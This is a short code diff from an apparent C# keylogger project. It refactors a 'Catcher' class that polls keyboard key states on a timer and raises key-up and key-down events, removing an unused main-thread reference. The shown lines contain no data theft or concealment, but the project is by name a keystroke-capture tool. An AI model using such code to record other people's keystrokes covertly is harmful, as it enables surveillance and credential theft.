@@ -35,7 +35,6 @@ namespace Keylogger
 
         System.Timers.Timer timer;
         int delay;
-        Thread mainThread;
         public int Delay { get => delay; set => ChangeDelay(value); }
         public bool IsActive { get => timer.Enabled; }
 
@@ -43,7 +42,7 @@ namespace Keylogger
         public event KeyHandler KeyDown;
         public event KeyHandler KeyUp;
         Dictionary<Keys, bool> prevStatus;
-        public Catcher(int delay, Thread mainThread)
+        public Catcher(int delay)
         {
             prevStatus = new Dictionary<Keys, bool>();
             for (int i = 0; i < 256; i++)
@@ -53,7 +52,6 @@ namespace Keylogger
             timer = new System.Timers.Timer(delay);
             Delay = delay;
             timer.Elapsed += CheckKeys;
-            this.mainThread = mainThread;
         }
         public void Start()
         {
